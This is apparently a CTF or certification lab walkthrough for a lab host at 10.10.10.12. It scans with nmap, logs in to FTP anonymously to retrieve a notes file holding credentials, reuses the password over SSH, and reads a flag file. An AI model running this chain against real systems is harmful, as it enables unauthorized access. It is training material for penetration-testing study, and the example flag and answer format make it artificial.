# Scenario 02 — FTP Anonymous to SSH Credential Reuse

**Difficulty:** 🟢 | **Time:** ~15 min | **Domains:** 02 Scanning, 03 Enumeration, 05 System Hacking
**Tools:** [nmap](../../tools/nmap.md), `ftp`, `ssh`

## Story
Target `10.10.10.12` has leaked credentials in plain sight. Retrieve the contents of `/home/jenny/user.txt`.

## Step 1 — Scan
```bash
nmap -sV -sC -p- -T4 10.10.10.12
```
**Expected finding:** 21/ftp vsftpd 3.0.3, 22/ssh OpenSSH 7.6p1.
**→ Tool ref:** [nmap](../../tools/nmap.md#scan-techniques)

## Step 2 — Check anonymous FTP
```bash
nmap -p 21 --script ftp-anon 10.10.10.12
# or manually:
ftp 10.10.10.12
# user: anonymous   pass: anonymous
ftp> ls -la
ftp> get notes.txt
ftp> bye
```
**Expected finding:** `Anonymous FTP login allowed`, file `notes.txt` downloaded.
**→ Tool ref:** [ftp-anon NSE](../../tools/nmap.md#nse-scripts-the-money-section)

## Step 3 — Read the loot
```bash
cat notes.txt
```
**Expected finding:** something like `jenny / Summer2023!` or "reminder: my SSH pass is …".

## Step 4 — Credential reuse on SSH
```bash
ssh jenny@10.10.10.12
# password from notes.txt
```
**Expected finding:** shell as `jenny`.

## Step 5 — Grab the flag
```bash
cat /home/jenny/user.txt
```

## Step 6 — Final answer
**Answer format:** the flag string (e.g. `FLAG{r3us3d_cr3ds_4r3_bad}`).

## Gotchas across this chain
- Anonymous FTP often allows login but no read — try `ls` and `get` before assuming failure.
- Files may be in `pub/`, `incoming/`, or hidden with `ls -la`.
- Creds in notes often belong to a *different* user than the filename hints at — try every username found.
- If SSH reuse fails, try the same password against the same username over FTP/SMB/web.
- Use `binary` mode in ftp before `get` on non-text files.

## Variant questions this scenario teaches you to handle
- "Is anonymous FTP enabled?" → step 2.
- "What is the FTP banner version?" → step 1.
- "Find credentials leaked on the target" → steps 2–3.
- "Get a shell on 10.10.10.12" → steps 1–4.
